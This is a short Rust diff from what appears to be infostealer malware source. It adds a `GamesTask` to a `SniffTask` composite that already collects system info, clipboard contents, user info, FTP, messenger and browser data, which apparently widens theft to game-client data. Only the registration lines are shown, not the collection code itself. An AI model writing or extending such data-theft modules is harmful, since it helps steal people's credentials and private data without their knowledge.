@@ -19,6 +19,7 @@ use collector::Collector;
 use filesystem::path::Path;
 use filesystem::FileSystem;
 use ftp::FtpTask;
+use games::GamesTask;
 use messengers::MessengersTask;
 use tasks::{composite_task, CompositeTask, Task};
 
@@ -36,6 +37,7 @@ impl<C: Collector + 'static, F: FileSystem + 'static> Default for SniffTask<C, F
                 SystemInfoTask,
                 ClipboardTask,
                 UserInfoTask,
+                GamesTask::default(),
                 FtpTask::default(),
                 MessengersTask::default(),
                 BrowsersTask::default(),
